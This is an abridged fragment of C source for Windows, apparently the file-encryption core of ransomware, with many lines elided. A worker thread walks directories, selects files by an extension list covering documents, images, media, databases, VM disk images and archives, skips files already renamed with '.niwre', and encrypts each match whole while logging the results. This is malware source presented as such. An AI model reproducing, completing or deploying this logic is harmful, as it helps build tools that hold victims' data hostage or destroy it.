...
DWORD WINAPI workerThread(LPVOID lpParam) // Thread that uses the queue to search for files inside directories
{
    ...
    const PWSTR extensions[] = { 
        L".txt", L".doc", L".pdf", L".jpg", L".png", L".mp3", 
        L".mp4", L".avi", L".conf", L".csv", L".sql", L".mkv", 
        L".docx", L".xls", L".xlsx", L".msg", L".vmdk", L".vmx", 
        L".vdi", L".zip", L".tar", L".ps1", L".psh", L".db", L".sqlite3", L".db3", L".sqlitedb", 0
    };
    ...
    while(dequeue(directoryPath))
    {
        ...
        do 
        {
            ...
            if (_wcscmp(fileExtension, L".niwre") == 0) 
            {
                continue; // Skip files already encrypted
            }

            for (int i = 0; i < ext_count; i++) // Check if the file has one of the extensions
            {
                
                if (fileExtension && lstrcmpiW(fileExtension, extensions[i]) == 0) // Check if the file has one of the extensions
                {
                    ...
                    if(len3 > MAX_PATH) // Check if the file path is greater then MAX_PATH
                    {
                        ...
                        status = EncryptWholeFileW(fileBufferUNC); // Encrypt the file
                        if(status)
                        {
                            _StringCchCatW(fileBufferUNC, 4096, L"\n");
                            EnterCriticalSection(&critSec);
                        ...
                        {
                            writeToConsoleW(L"Failed to encrypt file: ");
                    ...
                    else
                    {
                        ...
                        status = EncryptWholeFileW(fileBuffer); // Encrypt the file
                        if(status)
                        {
                            _StringCchCatW(fileBuffer, MAX_PATH, L"\n");
                            EnterCriticalSection(&critSec);
...
int ExecuteSearchFile(PWSTR lpDirectory)
{
    ...
    wsprintfW(logFileName, L"debug_log_enc_%02d-%02d-%04d.txt", lt.wDay, lt.wMonth, lt.wYear);
    ...
    writeToConsoleW(L"File Encryption Started!\n");
    ...
    writeToConsoleW(L"File Encryption Finished!\n");
